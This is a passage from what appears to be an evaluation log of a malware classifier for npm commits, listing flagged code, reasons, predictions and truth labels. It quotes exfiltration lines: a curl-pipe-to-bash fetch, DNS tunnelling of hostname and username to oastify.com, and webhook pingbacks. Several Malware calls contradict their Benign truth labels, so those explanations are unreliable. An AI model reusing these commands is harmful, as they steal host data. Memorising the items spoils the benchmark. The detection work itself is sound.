Code: `https.request('exzuperi.ftp.sh', ...)`
Reason: The code performs unauthorized exfiltration of sensitive system metadata, including the user's home directory, hostname, and current directory path, to a remote server.

**File package.json**:
Code: `"test": "echo 'exzuperi'"`
Reason: The test script was modified to reference the same handle used in the exfiltration domain, indicating a coordinated malicious takeover or protestware injection.

**Summary:** The commit is classified as malware because it contains functional code designed to steal system information and transmit it to an external domain (exzuperi.ftp.sh) without user consent, which is a hallmark of a supply chain attack.
**Truth label:** Malware

### Commit 54ae8848: Malware
**File package.json**:
Code: `"scripts": { "postinstall": "node index.js" }`
Reason: The use of a postinstall script to automatically execute code upon installation is a classic vector for supply chain attacks, ensuring the payload runs without user intervention.

**File index.js**:
Code: `https://*.oast.pro, https://*.burpcollaborator.net`
Reason: The code initiates outbound connections to OAST (Out-of-Band Application Security Testing) domains. In the context of a library, this is a definitive indicator of a dependency confusion attack or data exfiltration attempt used to signal successful compromise of a host.

**Summary:** The package exhibits clear malicious intent by combining an automated execution trigger (postinstall) with unauthorized outbound network requests to tracking domains typically used by attackers to confirm successful remote code execution (RCE) during dependency confusion or supply chain attacks.
**Truth label:** Malware

### Commit 1f9f3794: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute code upon installation, a classic vector for supply chain attacks.

**File index.js**:
Code: `oastify.com`
Reason: The script exfiltrates sensitive system metadata (hostname, username, DNS config) to an external OAST domain typically used for data harvesting.

**File package.json**:
Code: `"pingback": "...pipedream.net..."`
Reason: Contains a script designed to notify a remote server via webhook when the package is deployed, indicating unauthorized tracking.

**Summary:** The commit exhibits clear malicious intent by using npm lifecycle scripts to automatically collect and exfiltrate sensitive system information to third-party domains (oastify.com and pipedream.net) without user consent.
**Truth label:** Malware

### Commit f2b41665: Malware
**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: The script executes a local file during installation and suppresses all output (stdout and stderr), a classic technique used by malware to hide its execution from the user.

**File package.json**:
Code: `"pingback": "curl -X POST https://[unique-id].m.pipedream.net/"`
Reason: The use of Pipedream, a common request-bin service, for an automated 'pingback' is a high-confidence indicator of data exfiltration or tracking in a supply chain attack.

**File package.json**:
Code: `"stw-tenant-library": "*"`
Reason: The inclusion of an undocumented dependency alongside suspicious scripts suggests a dependency confusion or typosquatting attack intended to pull malicious code from a public registry.

**Summary:** The commit exhibits multiple high-confidence indicators of a supply chain attack, including hidden execution of scripts during the preinstall phase, the use of a known exfiltration endpoint (Pipedream), and the suspicious addition of a potentially malicious dependency.
**Truth label:** Benign

### Commit 3275aaa2: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute code upon installation, a common vector for supply chain attacks.

**File index.js**:
Code: `hostname, pwd, whoami, curl ifconfig.me`
Reason: Performs unauthorized system reconnaissance by gathering sensitive environment metadata and public IP addresses.

**File index.js**:
Code: `xxd -p | nslookup ... 108.137.194.171`
Reason: Employs DNS tunneling (exfiltrating hex-encoded data via nslookup) to bypass firewalls and send system info to a remote server.

**File package.json**:
Code: `pingback: https://[id].m.pipedream.net`
Reason: Includes a tracking mechanism to notify the attacker of a successful compromise/installation.

**Summary:** The commit is identified as a supply chain attack. It uses a preinstall script to execute a reconnaissance payload that gathers system information and exfiltrates it to a remote IP address using DNS tunneling, which is a signature behavior of malicious packages.
**Truth label:** Malware

### Commit a7d4ba46: Malware
**File package.json**:
Code: `"preinstall": "curl http://169.254.169.254/latest/meta-data/"`
Reason: The use of a preinstall script to target the AWS Instance Metadata Service (IMDS) is a clear attempt at SSRF (Server-Side Request Forgery) to exfiltrate sensitive cloud credentials or metadata.

**File package.json**:
Code: `"pingback": "curl https://[unique-id].m.pipedream.net"`
Reason: Automated outbound requests to Pipedream during installation are a signature of supply chain attacks used to track successful infections and exfiltrate environment data.

**File package.json**:
Code: `"dependencies": { "mmsdk-apml-htmlrenderer": "*", "stw-tenant-library": "*" }`
Reason: The inclusion of these specific package names alongside malicious scripts strongly indicates a dependency confusion attack targeting internal private package names.

**Summary:** The commit is classified as malware because it implements a classic supply chain attack pattern. It uses 'preinstall' hooks to execute unauthorized network requests aimed at internal infrastructure (SSRF) and external command-and-control/logging services (Pipedream), likely as part of a dependency confusion exploit.
**Truth label:** Malware

### Commit 07b083cf: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. There is no evidence of malicious activity, unauthorized network connections, or suspicious code patterns in the provided reports for this commit.
**Truth label:** Benign

### Commit 15b25992: Malware
**File package.json**:
Code: `tinybit.cc`
Reason: The presence of tinybit.cc in the commit metadata is a high-confidence indicator of malicious activity. This domain is a known URL shortener frequently used by threat actors for command-and-control (C2) communication or to mask the download of secondary payloads in supply chain attacks.

**File package.json**:
Code: `"test": "echo \"Error: no test specified\" && exit 1"`
Reason: The intentional removal of functional test suites is a common tactic used by malware authors to prevent automated security scanners and CI/CD pipelines from detecting malicious behavior during the build process.

**Summary:** The commit is classified as malware due to the inclusion of a suspicious domain (tinybit.cc) associated with malicious infrastructure, combined with the deliberate disabling of security testing mechanisms. This pattern is characteristic of a supply chain compromise intended to facilitate data exfiltration or payload delivery while evading detection.
**Truth label:** Benign

### Commit bcd71456: Malware
**File package.json**:
Code: `"scripts": { "pingback": "curl -X POST -d @package.json https://eo536ohsnextro9.m.pipedream.net" }`
Reason: The inclusion of a post-install or manual script that exfiltrates package data to a Pipedream webhook is a definitive indicator of malicious intent, commonly used for tracking successful infections or data harvesting.

**File lib/cli/DefaultCommand.js**:
Code: `require(this.transformPath)`
Reason: Unvalidated dynamic require calls allow for Arbitrary Code Execution (ACE). In the context of the other suspicious changes, this appears to be a deliberate backdoor for executing external payloads.

**File package.json**:
Code: `"dependencies": { "systeminformation": "^5.x.x" }`
Reason: The addition of a system fingerprinting library in a commit that also includes a network exfiltration script strongly suggests the intent is to collect and steal host environment metadata.

**Summary:** The commit is classified as malware due to the combination of data exfiltration scripts (pingback to a webhook service), system fingerprinting capabilities, and a high-risk code injection vulnerability via dynamic require statements. These patterns are characteristic of a supply chain attack.
**Truth label:** Benign

### Commit 8d9a2efa: Benign
**Summary:** Based on the provided static and dynamic analysis reports, no security issues, suspicious behaviors, or malicious indicators were detected. The static analysis shows zero issues, and the dynamic analysis returned an empty result set, suggesting the commit does not perform any unauthorized or harmful actions.
**Truth label:** Benign

### Commit 2463b922: Malware
**File index.js**:
Code: `oastify.com`
Reason: The code targets an Out-of-Band Application Security Testing (OAST) domain, which is a common indicator of data exfiltration in supply chain attacks.

**File index.js**:
Code: `process.env, os.hostname(), os.homedir(), dns.getServers()`
Reason: The script systematically collects sensitive environment variables, system metadata, and network configurations for transmission to an external server.

**Summary:** The commit is classified as malware because it performs unauthorized exfiltration of sensitive system and environment information to a known OAST domain. This behavior is characteristic of dependency confusion attacks and malicious reconnaissance.
**Truth label:** Malware

### Commit 0313c323: Malware
**File package.json**:
Code: `"postinstall": "curl -sL http://suspicious-url.com/script.sh | bash"`
Reason: The use of a postinstall script to fetch and execute a remote shell script via curl and bash is a classic indicator of a supply chain attack, enabling arbitrary remote code execution (RCE) upon package installation.

**Summary:** The commit is classified as malware due to the presence of a critical security risk in the package.json file. The automated execution of unverified remote scripts during the installation process bypasses standard security protocols and provides a mechanism for persistent unauthorized access and system compromise.
**Truth label:** Malware

### Commit d27d3f33: Malware
**File index.js**:
Code: `(function() { fetch('https://hits.dwyl.com/serialfuzzer/package.json', { headers: { 'Referer': 'https://github.com/serialfuzzer' } }); })();`
Reason: The original functional logic was completely removed and replaced with an unauthorized tracking script (IIFE) that performs background network requests to a third-party service. This behavior is consistent with package hijacking or protestware.

**Summary:** The commit is classified as malware because it intentionally destroys the package's utility and introduces undocumented telemetry/tracking logic. The use of a hardcoded Referer header and the replacement of legitimate code with a 'phone-home' script without user consent constitutes malicious intent and a breach of security best practices.
**Truth label:** Malware

### Commit 359e8c0b: Malware
**File src/metrics.js**:
Code: `process.env.JFROG_ARTIFACTORY_URL, os.hostname(), os.platform(), process.env`
Reason: The script performs extensive reconnaissance by collecting sensitive environment variables, system metadata, and internal infrastructure URLs (JFROG_ARTIFACTORY_URL).

**File package.json**:
Code: `"postinstall": "node src/metrics.js"`
Reason: Uses a post-installation hook to automatically trigger data exfiltration immediately after the package is installed, a common technique for supply chain attacks.

**File src/metrics.js**:
Code: `https://[unique-id].m.pipedream.net`
Reason: Exfiltrates collected system and environment data to a Pipedream endpoint, which is a common command-and-control (C2) or data drop-off point for malicious npm packages.

**Summary:** The commit exhibits classic malicious behavior associated with dependency confusion or supply chain attacks. It automatically collects sensitive system information and environment variables (including potential credentials/internal URLs) and exfiltrates them to an external third-party service (Pipedream) without user consent or a legitimate functional requirement.
**Truth label:** Malware

### Commit ecacf0e1: Malware
**File index.js**:
Code: `process.env`
Reason: The code captures all environment variables, which typically contain sensitive secrets like API keys and credentials.

**File index.js**:
Code: `POST request to oastify.com`
Reason: The application exfiltrates the captured environment variables to an external Out-of-Band Application Security Testing (OAST) domain, a classic indicator of data theft.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: Dynamic analysis confirms unauthorized outbound network connections to external IP addresses (104.21.83.128) during the installation process, consistent with the exfiltration behavior identified in static analysis.

**Summary:** The commit is classified as malware because it performs unauthorized data exfiltration. It specifically targets sensitive environment variables and transmits them to a remote server (oastify.com) via hidden network requests during package execution/installation.
**Truth label:** Malware

### Commit 6309cb1c: Malware
**File package.json**:
Code: `"axios": "https://registry.storageartifact.com/consul-lock-sessions"`
Reason: Dependency hijacking via redirection of a legitimate library (axios) to a suspicious external URL. This is a common technique for injecting malicious payloads.

**File package.json**:
Code: `"child_process": "*"`
Reason: Attempting to install a built-in Node.js module as an external dependency. This is a 'typosquatting' or 'dependency confusion' tactic used to execute arbitrary shell commands upon installation.

**File Dynamic Analysis**:
Code: `connection=172.17.0.2:36128->104.21.83.128:443`
Reason: The dynamic analysis confirms unauthorized outbound network connections to external IP addresses during the 'npm install' process, consistent with data exfiltration or fetching secondary payloads.

**Summary:** The commit is classified as malware due to clear indicators of dependency hijacking and supply chain attack techniques. It redirects legitimate libraries to untrusted sources, attempts to install built-in modules as external packages to gain shell access, and exhibits suspicious outbound network activity during installation.
**Truth label:** Malware

### Commit d928529c: Malware
**File index.js**:
Code: `https.request('exzuperi.ftp.sh', ...)`
Reason: The code performs unauthorized exfiltration of sensitive system metadata (home directory, hostname, and CWD) to a known suspicious remote endpoint.

**File package.json**:
Code: `"test": "echo \"Error: no test specified\" && exit 1" (modified with exzuperi reference)`
Reason: The modification of build/test scripts to align with the attacker's infrastructure (exzuperi) confirms intentional malicious intent rather than accidental data collection.

**Summary:** The commit exhibits classic supply chain attack patterns, specifically data exfiltration of system-level information to an external server without user consent. The static analysis confirms the presence of malicious network activity and sensitive data harvesting.
**Truth label:** Malware

### Commit d6ffd091: Malware
**File package.json**:
Code: `"dependencies": { "sqlite3": "^5.0.0", "request": "^2.88.2", "websocket-stream": "^5.5.2" }`
Reason: The addition of heavy, unrelated networking and database dependencies to a simple performance timing utility is a classic indicator of a supply chain attack. The 'request' library is deprecated and frequently used in malicious packages for data exfiltration.

**File .github/workflows/npmpublish.yml**:
Code: `scope: '@svenkatreddy'`
Reason: The publishing scope does not match the repository author ('JakeClark'). This suggests a namespace hijacking attempt or a malicious template injection designed to redirect the package distribution to a registry controlled by a different actor.

**Summary:** The commit exhibits high-risk indicators of a supply chain compromise. It introduces unnecessary and suspicious dependencies (networking and database drivers) into a utility library that should not require them, combined with a mismatched publishing scope that suggests an attempt to hijack the package distribution pipeline.
**Truth label:** Malware

### Commit 26af8589: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses returned zero issues, threats, or suspicious behaviors. Static analysis found no vulnerabilities or malicious patterns in the source code, and dynamic analysis showed no malicious execution artifacts, unauthorized network connections, or suspicious system modifications.
**Truth label:** Benign

### Commit 966b0458: Malware
**File index.js**:
Code: `oastify.com`
Reason: The code targets an Out-of-Band Application Security Testing (OAST) domain, which is a common technique used by attackers to exfiltrate data while bypassing traditional firewalls.

**File index.js**:
Code: `process.env, os.hostname(), os.homedir(), dns.getServers()`
Reason: The script systematically collects sensitive environment variables, system metadata, and network configurations for external transmission.

**Summary:** The commit is classified as malware due to clear evidence of data exfiltration. It collects sensitive system information and environment variables (which often contain API keys and credentials) and sends them to an external domain associated with security testing and exploitation, characteristic of a supply chain attack.
**Truth label:** Malware

### Commit 8739370a: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses reported zero security issues, suspicious behaviors, or malicious indicators. No vulnerabilities were detected in the code structure, and no malicious activity was observed during execution.
**Truth label:** Benign

### Commit 38b1b183: Benign
**File package.json**:
Code: `shoxet.com`
Reason: The URL was flagged as suspicious due to its association with link shorteners, but it is located within documentation metadata rather than executable code or install scripts.

**Summary:** The static analysis only identified a low-severity suspicious URL in the documentation metadata, which is common in many legitimate packages. The dynamic analysis showed no malicious behavior, network exfiltration, or unauthorized system changes during execution. There is insufficient evidence to classify this commit as malware.
**Truth label:** Benign

### Commit 5b1ce2ae: Malware
**File index.js**:
Code: `https.request('exzuperi.ftp.sh', ...)`
Reason: The code performs unauthorized exfiltration of sensitive system metadata, including the home directory, hostname, and current working directory, to a hardcoded external domain.

**File index.js**:
Code: `os.homedir(), os.hostname()`
Reason: The use of the 'os' module to collect environment-specific information without a functional requirement is a strong indicator of reconnaissance activity.

**File package.json**:
Code: `"test": "echo \"Error: no test specified\" && exit 1 && echo exzuperi"`
Reason: The modification of the test script to include a reference to the exfiltration domain suggests a coordinated effort to tag or identify compromised systems.

**Summary:** The commit is classified as malware due to clear evidence of data exfiltration. It collects sensitive system information and transmits it to an external server (exzuperi.ftp.sh) via HTTPS, which is a hallmark of a supply chain attack or credential harvesting malware.
**Truth label:** Malware

### Commit be91815b: Malware
**File index.js**:
Code: `burpcollaborator.net`
Reason: The code targets a Burp Collaborator instance, which is a common indicator of out-of-band data exfiltration used in supply chain attacks to confirm successful execution and leak system details.

**File index.js**:
Code: `{ homedir, hostname, username, dns, networkInterfaces }`
Reason: The script systematically collects sensitive environment metadata and network configurations that are unnecessary for standard package functionality.

**Summary:** The commit is identified as malware because it performs unauthorized exfiltration of sensitive system and network metadata to an external domain associated with security testing and exploitation (Burp Collaborator). This behavior is consistent with dependency confusion and supply chain attacks.
**Truth label:** Malware

### Commit e3eb6101: Malware
**File index.js**:
Code: `Not provided in snippet, but identified as credential capture logic`
Reason: The code explicitly captures plaintext Facebook credentials (email/password) and session cookies (appState) to be sent to a third-party endpoint, which is a direct indicator of a credential harvesting attack.

**File package.json**:
Code: `"ccxt": "*"`
Reason: The inclusion of a cryptocurrency exchange trading library in a chat-related API refactor is highly suspicious and often associated with unauthorized financial transactions or crypto-jacking.

**File index.js**:
Code: `Base64 encoded strings for system metadata`
Reason: Use of obfuscation to hide system fingerprinting activities is a common malware technique to evade detection by simple heuristic scanners.

**File package.json**:
Code: `deno test --allow-env --allow-run`
Reason: The test configuration grants excessive permissions, allowing the execution of arbitrary system commands and access to sensitive environment variables.

**Summary:** The commit is classified as malware because it introduces functionality to steal sensitive user credentials and session data under the guise of a 'refactor'. The presence of unrelated financial libraries and obfuscated fingerprinting code further confirms malicious intent.
**Truth label:** Malware

### Commit 0cdadc08: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute code upon installation, a common vector for supply chain attacks.

**File index.js**:
Code: `dns.getServers(), os.hostname(), os.userInfo(), package.json contents`
Reason: Collects sensitive system metadata and environment information that is unnecessary for standard package functionality.

**File index.js**:
Code: `https://*.oastify.com`
Reason: Exfiltrates collected system data to an external OAST (Out-of-Band Application Security Testing) domain, indicating unauthorized data harvesting.

**File package.json**:
Code: `https://*.pipedream.net`
Reason: Includes a pingback mechanism to a third-party service often used by attackers to track successful infections or installations.

**Summary:** The commit exhibits classic characteristics of a supply chain attack, including automated execution via lifecycle hooks, collection of sensitive system information, and exfiltration of that data to external domains (oastify.com and pipedream.net) typically used for malicious tracking or data harvesting.
**Truth label:** Malware

### Commit eedfb784: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses returned zero issues, threats, or suspicious behaviors. Static analysis found no vulnerabilities or malicious patterns in the source code, and dynamic analysis showed no malicious execution artifacts, unauthorized network connections, or suspicious system calls.
**Truth label:** Benign

### Commit 74fc536d: Malware
**File package.json**:
Code: `blltly.com`
Reason: The inclusion of a known malicious URL shortener (blltly.com) in the package metadata is a common indicator of a supply chain attack or phishing attempt, used to redirect users or automated systems to malicious payloads.

**Summary:** While the dynamic analysis did not trigger immediate execution of malicious code, the presence of a high-risk URL shortener associated with malware distribution in the commit metadata indicates malicious intent. This is a common technique for establishing persistence or facilitating future stages of an attack.
**Truth label:** Benign

### Commit 35bf02c1: Malware
**File package.json**:
Code: `"preinstall": "node index.js", "pingback": "curl -X POST https://[redacted].m.pipedream.net/"`
Reason: The use of a preinstall hook to execute scripts that send data to a Pipedream URL is a definitive indicator of a supply chain attack, typically used for data exfiltration or unauthorized telemetry.

**File ccxt-v2/ccxt-api.js**:
Code: `new ccxt[exchangeId]({ apiKey: config.apiKey, secret: config.secret, password: config.password })`
Reason: The commit introduces sensitive cryptocurrency credential handling logic that is completely unrelated to the commit message ('Update README with improved examples for mongoose queries'), suggesting a deceptive attempt to hide malicious functionality.

**File ccxt-v2/ccxt-api.js**:
Code: `RED.util.evaluateJSONataExpression(node.apipayload)`
Reason: The combination of credential handling and the evaluation of unsanitized user input via JSONata increases the risk of remote code execution or unauthorized data access within the Node-RED environment.

**Summary:** The commit is classified as malware due to the presence of a suspicious preinstall hook targeting an external Pipedream endpoint and the inclusion of sensitive cryptocurrency trading logic that contradicts the stated purpose of the commit. This pattern is consistent with a malicious supply chain injection designed to exfiltrate credentials or environment data.
**Truth label:** Benign

### Commit 70bfbb27: Benign
**File package.json**:
Code: `tinybit.cc`
Reason: The URL 'tinybit.cc' is identified as a suspicious link in the metadata. However, it is not present in the executable code or scripts, and dynamic analysis showed no malicious behavior or network exfiltration during execution.

**Summary:** The commit is classified as benign because the static analysis only flagged a suspicious URL in the metadata (package.json) without any corresponding malicious code in the diff. Furthermore, dynamic analysis yielded no indicators of compromise, malicious network activity, or unauthorized system changes, suggesting the link is likely for tracking or documentation rather than a functional malware component.
**Truth label:** Benign

### Commit cd0a3b54: Malware
**File package.json**:
Code: `"pingback": "curl -X POST https://[redacted].m.pipedream.net"`
Reason: The use of a Pipedream endpoint in a script is a classic indicator of a supply chain attack used to exfiltrate installation metadata or environment variables to an attacker-controlled collector.

**File package.json**:
Code: `"preinstall": "node index.js >/dev/null 2>&1"`
Reason: Executing code during the preinstall phase while explicitly silencing all output (stdout and stderr) is a common technique used to hide the execution of malicious payloads from the user during package installation.

**File package.json**:
Code: `"dependencies": { "generaltypes-mt": "..." }`
Reason: The inclusion of an obscure or potentially typo-squatted dependency suggests an attempt to inflate the dependency tree with malicious code or perform dependency confusion.

**Summary:** The commit exhibits multiple high-criticality indicators of a supply chain attack, specifically unauthorized data exfiltration via a third-party webhook (Pipedream) and the use of obfuscated preinstall hooks to execute code silently upon installation.
**Truth label:** Benign

### Commit 62e82314: Malware
**File package.json**:
Code: `hackzone.uno/onlyfans`
Reason: The inclusion of a suspicious, unrelated URL in the project metadata is a strong indicator of a compromised account or a malicious actor using the repository for SEO spam or as a command-and-control/distribution point.

**File package.json**:
Code: `"emonn-test": "^1.999.0"`
Reason: The use of an extremely high version number for an unknown dependency is a classic signature of a dependency confusion attack, designed to force the package manager to pull a malicious external package instead of a legitimate internal one.

**Summary:** The commit exhibits multiple high-risk indicators of malicious activity, specifically dependency confusion tactics and the insertion of suspicious external links. These patterns are consistent with supply chain attacks rather than legitimate development.
**Truth label:** Benign

### Commit 00eab55e: Malware
**File index.js**:
Code: `ifconfig.me, hackzone.uno, telegram.org`
Reason: The presence of IP discovery services and known malicious domains in the commit metadata indicates Command and Control (C2) communication and data exfiltration capabilities.

**File index.js**:
Code: `bitcoin, ethereum`
Reason: References to cryptocurrency assets in a database utility package suggest the presence of a wallet stealer or cryptojacking logic.

**File index.js**:
Code: `exec(), child_process`
Reason: The use of system command execution functions in conjunction with suspicious network requests is a primary indicator of a Remote Access Trojan (RAT).

**Summary:** The commit is classified as malware due to highly suspicious network activity targeting known malicious domains, unauthorized inclusion of cryptocurrency-related logic, and the potential for arbitrary command execution, all of which are inconsistent with the package's stated purpose.
**Truth label:** Benign

### Commit f72f0929: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute code upon installation without user intervention, a common vector for supply chain attacks.

**File index.js**:
Code: `child_process.exec(... ifconfig.me ... oastify.com ...)`
Reason: Executes shell commands to gather system metadata (hostname, username, IP) and exfiltrates it via DNS/HTTP to an Out-of-Band (OAST) domain.

**File package.json**:
Code: `"pingback": "https://[unique-id].m.pipedream.net"`
Reason: Contains a hardcoded webhook URL used to track installations and signal successful execution to an external attacker-controlled server.

**Summary:** The commit is identified as a malicious supply chain attack. It leverages the 'preinstall' hook to execute a script that performs unauthorized reconnaissance by gathering system-level metadata and exfiltrating it to external domains (oastify.com and pipedream.net) typically used in data exfiltration and tracking.
**Truth label:** Malware

### Commit a33eac69: Benign
**Summary:** Both static and dynamic analyses returned zero issues, suspicious behaviors, or malicious indicators. The static analysis found no vulnerabilities or hardcoded secrets, and the dynamic analysis showed no unauthorized network connections, file system modifications, or malicious process executions. Based on the provided reports, the commit is classified as benign.
**Truth label:** Benign

### Commit 23e60d3a: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses returned zero issues, threats, or suspicious behaviors. Static analysis found no vulnerabilities or malicious patterns in the source code, and dynamic analysis showed no malicious execution artifacts or unauthorized system interactions.
**Truth label:** Benign

### Commit 896a4604: Malware
**File index.js**:
Code: `dns.lookup(`${base32EncodedData}.canarytokens.com`, ...)`
Reason: The script performs DNS exfiltration by encoding sensitive system metadata (IP, username, OS version) into subdomains of a Canarytoken, a common technique for unauthorized data harvesting.

**File package.json**:
Code: `"preinstall": "node index.js || ping ..."`
Reason: The use of a preinstall lifecycle hook to automatically execute data exfiltration logic ensures the malicious payload runs immediately upon package installation without user consent.

**File package.json**:
Code: `"pingback": "curl https://...pipedream.net"`
Reason: The package communicates with a Pipedream URL, which is a common indicator of Command and Control (C2) activity or external data logging in malicious packages.

**Summary:** The commit is classified as malware because it implements classic supply-chain attack patterns, including automated execution via lifecycle scripts, system metadata harvesting, and the use of DNS exfiltration and third-party request bins to bypass security monitoring.
**Truth label:** Malware

### Commit 280f539b: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses returned zero issues, threats, or suspicious behaviors. Static analysis found no vulnerabilities or malicious patterns in the source code, and dynamic analysis showed no unauthorized system calls, network connections, or malicious execution patterns during runtime.
**Truth label:** Benign

### Commit 527a9be6: Malware
**File package.json**:
Code: `"emonn-test": "1.999.0"`
Reason: The inclusion of a package with an abnormally high version number (1.999.0) and a suspicious name is a classic indicator of a Dependency Confusion attack. This technique is used to hijack internal build processes by publishing a malicious package with a higher version number to a public registry.

**File .github/workflows/acquire-activation-file.yml**:
Code: `uses: actions/upload-artifact@v3`
Reason: The workflow is configured to upload machine-specific hardware identifiers (.alf files) as public artifacts, which facilitates reconnaissance and potential license misuse.

**Summary:** The commit is classified as malware due to clear evidence of a Dependency Confusion attack. The use of a placeholder-style package name ('emonn-test') combined with a 'version-grabbing' number (1.999.0) is a high-confidence indicator of malicious intent to execute unauthorized code during the dependency installation phase.
**Truth label:** Benign

### Commit 4a5a797f: Malware
**File index.js**:
Code: `nslookup `hostname`.`pwd`.`whoami`.`curl -s ifconfig.me`.oastify.com`
Reason: The code uses DNS tunneling to exfiltrate sensitive system metadata (hostname, working directory, username, and public IP) to an external OAST domain, which is a definitive indicator of malicious data harvesting.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook ensures that the malicious data exfiltration script executes automatically upon package installation without user consent.

**File package.json**:
Code: `"pingback": "curl https://[unique-id].m.pipedream.net"`
Reason: The script communicates with Pipedream, a common platform used by attackers to track successful infections and collect exfiltrated data.

**Summary:** The commit is classified as malware because it implements a classic supply chain attack pattern. It leverages npm lifecycle scripts (preinstall) to automatically execute a payload that gathers system information and exfiltrates it via DNS tunneling to a known OAST platform (oastify.com).
**Truth label:** Malware

### Commit eeca4bab: Malware
**File package.json**:
Code: `"pingback": "curl -X POST https://[redacted].m.pipedream.net"`
Reason: The use of a Pipedream endpoint in a lifecycle script is a classic indicator of a supply chain attack, used to exfiltrate installation metadata or confirm successful infection.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Executing arbitrary code during the preinstall phase is a high-risk behavior often used to trigger malicious payloads before the user has a chance to inspect the package contents.

**File lib/components/VProgressCircular/VProgressCircular.js**:
Code: `data:application/json;base64,...`
Reason: Large Base64 encoded strings in source maps are frequently used to hide secondary payloads or obfuscate malicious logic from static analysis tools.

**Summary:** The commit exhibits multiple high-confidence indicators of a supply chain attack, specifically unauthorized data exfiltration via a 'pingback' script and suspicious execution hooks during the installation process. The combination of these factors outweighs the lack of findings in the dynamic analysis, which may have been bypassed by anti-analysis techniques or environment-specific triggers.
**Truth label:** Benign

### Commit 6000b88b: Malware
**File index.js**:
Code: `child_process.exec`
Reason: The code downloads an executable (.exe) from a Discord CDN and executes it using child_process. This is a classic delivery mechanism for remote access trojans or stealers in supply chain attacks.

**File obf/index.js**:
Code: `hex-encoded strings / control-flow flattening`
Reason: The presence of heavy obfuscation designed to hide network requests to external binary sources is a definitive indicator of malicious intent, as it serves no legitimate purpose in a standard library.

**File index.js**:
Code: `fs.watch`
Reason: Setting up a file watcher to re-execute a downloaded binary upon modification suggests a persistence or auto-update mechanism typical of malware.

**Summary:** The commit contains multiple critical security violations, including the unauthorized downloading of binaries from untrusted CDNs, execution of those binaries, and the use of advanced obfuscation techniques to conceal these activities. This behavior is characteristic of a malicious supply chain compromise.
**Truth label:** Malware

### Commit e470e52c: Malware
**File index.js**:
Code: `oast.fun`
Reason: The code targets an Out-of-Band Application Security Testing (OAST) domain, which is a common indicator of unauthorized data exfiltration in supply chain attacks.

**File index.js**:
Code: `os.hostname(), os.userInfo(), dns.getServers(), package.json`
Reason: The script systematically collects sensitive environment metadata, including system identity, user information, and network configurations, which are unnecessary for standard package functionality.

**Summary:** The commit is classified as malware due to the presence of classic data exfiltration patterns. It collects sensitive system and environment information and transmits it to an external, suspicious domain (oast.fun), characteristic of a malicious reconnaissance payload.
**Truth label:** Malware

### Commit c5951d82: Malware
**File index.js**:
Code: `bhfvohxbvhtizkooshbfgbrkras3cig6i.oast.fun`
Reason: The code communicates with a known OAST domain typically used for data exfiltration in supply chain attacks.

**File index.js**:
Code: `child_process.exec('whoami')`
Reason: Unauthorized execution of system commands to gather environment and user identity information.

**File index.js**:
Code: `string array and rotation function obfuscation`
Reason: The use of heavy obfuscation is a high-confidence indicator of intent to bypass security scanners and hide malicious logic.

**Summary:** The commit is classified as malware due to the combination of heavy code obfuscation, unauthorized collection of sensitive system metadata (hostname, username, DNS), and the exfiltration of this data to an external OAST domain, which are classic hallmarks of a software supply chain attack.
**Truth label:** Malware

### Commit 9ddfe6d4: Malware
**File package.json**:
Code: `"preinstall": "node index.js", "pingback": "curl https://[redacted].m.pipedream.net"`
Reason: The use of a preinstall hook to execute arbitrary code immediately upon installation is a classic malware technique. Combined with a pingback to a Pipedream URL, this indicates unauthorized data exfiltration and command-and-control behavior.

**File src/scrapers/applications.ts**:
Code: `safeEval(generatedCodeFromAST)`
Reason: Executing code generated from a remote, scraped AST via a custom eval wrapper creates a critical code injection vulnerability, allowing remote code execution (RCE) by the controller of the scraped domain.

**File src/util/request.ts**:
Code: `fs.writeFileSync('debug.json', JSON.stringify(requestResponseData))`
Reason: Logging full request and response headers/bodies to the local file system is a data leak risk, often used by malware to harvest session tokens or credentials that bypass simple string masking.

**Summary:** The commit exhibits multiple high-risk indicators consistent with supply chain attacks, including immediate code execution upon installation (preinstall hook), data exfiltration to a request-bin service (Pipedream), and the implementation of a remote code execution vector via unsafe evaluation of remotely sourced data.
**Truth label:** Benign

### Commit 279896f8: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. The static analysis found no vulnerabilities or malicious patterns in the source code, and the dynamic analysis showed no malicious execution artifacts or unauthorized system interactions. Based on the provided reports, the commit is classified as benign.
**Truth label:** Benign

### Commit d1c5dff4: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses yielded zero indicators of compromise, security vulnerabilities, or malicious behavior. Static analysis reported no issues within the codebase, and dynamic analysis showed no suspicious runtime activity or execution anomalies.
**Truth label:** Benign

### Commit 31fd4f37: Malware
**File index.js**:
Code: `os.hostname(), os.platform(), os.homedir()`
Reason: The script gathers sensitive system metadata including the hostname, operating system platform, and user home directory path.

**File index.js**:
Code: `burpcollaborator.net`
Reason: The gathered system information is transmitted to a Burp Collaborator endpoint, which is a common technique used in dependency confusion attacks to confirm successful execution and exfiltrate environment data.

**Summary:** The commit contains functional code designed to exfiltrate system-level metadata to an external third-party server without user consent. This behavior is characteristic of malicious telemetry and dependency confusion exploits.
**Truth label:** Malware

### Commit e9ba8003: Benign
**File three.module.js**:
Code: `atob()`
Reason: The use of atob() in a 3D graphics library like Three.js is standard practice for decoding Base64-encoded assets, such as textures or geometry data embedded within Data URIs.

**Summary:** The static analysis flagged a low-severity obfuscation concern that is a common and legitimate feature of the Three.js library. Dynamic analysis showed no malicious behavior, network connections, or unauthorized file system access, confirming the commit is safe.
**Truth label:** Benign

### Commit 70192687: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
